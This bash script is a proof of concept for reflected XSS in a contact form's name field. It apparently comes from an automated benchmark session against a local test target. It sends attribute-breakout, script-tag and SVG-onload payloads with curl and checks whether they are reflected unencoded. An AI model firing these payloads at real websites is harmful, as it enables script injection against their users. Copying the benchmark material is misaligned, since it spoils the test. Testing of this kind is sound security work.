#!/bin/bash
# POC: Demonstrates reflected XSS in the contact form name field by submitting payloads that break out of the HTML attribute and execute JavaScript
# Target: ./repo
# Created: 2025-11-07T16:54:22.217Z
# Session: benchmark-XBEN-061-24-mhp3932p

# Reflected XSS in Contact Form - Name Field POC
# This script demonstrates reflected XSS vulnerability in the contact form

TARGET="http://localhost:8080/contact.php"
OUTPUT_FILE="/tmp/xss_response.html"

echo "[*] Testing Reflected XSS in Contact Form - Name Field"
echo "[*] Target: $TARGET"
echo ""

# Test Case 1: Event Handler Injection
echo "[+] Test Case 1: Event Handler Injection (onfocus + autofocus)"
PAYLOAD='name=" onfocus="alert(1)" autofocus="&email=&message=test'
echo "[*] Payload: $PAYLOAD"

RESPONSE=$(curl -s -X POST "$TARGET" -d "$PAYLOAD" 2>/dev/null)

# Check if the injected event handler appears in the response
if echo "$RESPONSE" | grep -q 'onfocus="alert(1)"'; then
    echo "[✓] VULNERABLE - Event handler injection successful!"
    echo "[*] Response snippet:"
    echo "$RESPONSE" | grep -o 'value="[^"]*onfocus[^"]*"' | head -1
    echo ""
else
    echo "[-] Event handler injection not found in response"
    echo ""
fi

# Test Case 2: Script Tag Injection
echo "[+] Test Case 2: Script Tag Injection"
PAYLOAD='name="><script>alert(1)</script>&email=&message=test'
echo "[*] Payload: $PAYLOAD"

RESPONSE=$(curl -s -X POST "$TARGET" -d "$PAYLOAD" 2>/dev/null)

# Check if the script tag appears in the response
if echo "$RESPONSE" | grep -q '<script>alert(1)</script>'; then
    echo "[✓] VULNERABLE - Script tag injection successful!"
    echo "[*] Response shows injected script tag:"
    echo "$RESPONSE" | grep -o '<input[^>]*name="name"[^>]*>' | head -1
    echo "$RESPONSE" | grep -o '<script>alert(1)</script>' | head -1
    echo ""
else
    echo "[-] Script tag not found in response"
    echo ""
fi

# Test Case 3: SVG Onload Injection
echo "[+] Test Case 3: SVG Onload Injection"
PAYLOAD="name='><svg onload=alert(1)>&email=&message=test"
echo "[*] Payload: $PAYLOAD"

RESPONSE=$(curl -s -X POST "$TARGET" -d "$PAYLOAD" 2>/dev/null)

# Check if the SVG tag appears in the response
if echo "$RESPONSE" | grep -q '<svg onload=alert(1)>'; then
    echo "[✓] VULNERABLE - SVG onload injection successful!"
    echo "[*] Response shows injected SVG tag:"
    echo "$RESPONSE" | grep -o "value='[^']*'>" | head -1
    echo ""
else
    echo "[-] SVG tag not found in response"
    echo ""
fi

# Additional verification - check if htmlspecialchars is applied
echo "[+] Verification: Checking if output encoding is applied"
PAYLOAD='name=<&">&email=&message=test'
echo "[*] Test payload with HTML special characters: $PAYLOAD"

RESPONSE=$(curl -s -X POST "$TARGET" -d "$PAYLOAD" 2>/dev/null)

# If properly encoded, special chars should be converted to entities
if echo "$RESPONSE" | grep -q '&lt;&amp;&quot;&gt;' || echo "$RESPONSE" | grep -q '&#'; then
    echo "[*] Output appears to be encoded - likely protected"
else
    echo "[✓] Special characters not encoded - vulnerable to XSS"
fi

echo ""
echo "[*] POC Complete"